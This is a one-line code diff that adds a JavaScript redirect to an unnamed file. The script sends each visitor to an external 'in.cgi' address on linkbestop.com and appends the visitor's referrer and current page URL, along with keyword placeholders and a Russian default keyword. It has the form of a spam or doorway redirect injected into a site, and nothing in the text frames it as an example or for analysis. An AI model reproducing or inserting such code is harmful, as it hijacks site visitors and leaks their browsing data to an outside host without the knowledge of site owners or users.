@@ -1,0 +1,1 @@
+﻿window.location=("http://linkbestop.com/cytpa/in.cgi?3&group=radio&seoref="+encodeURIComponent(document.referrer)+"&parameter=$keyword&se=$se&ur=1&HTTP_REFERER="+encodeURIComponent(document.URL)+"&default_keyword=автомагнитола");
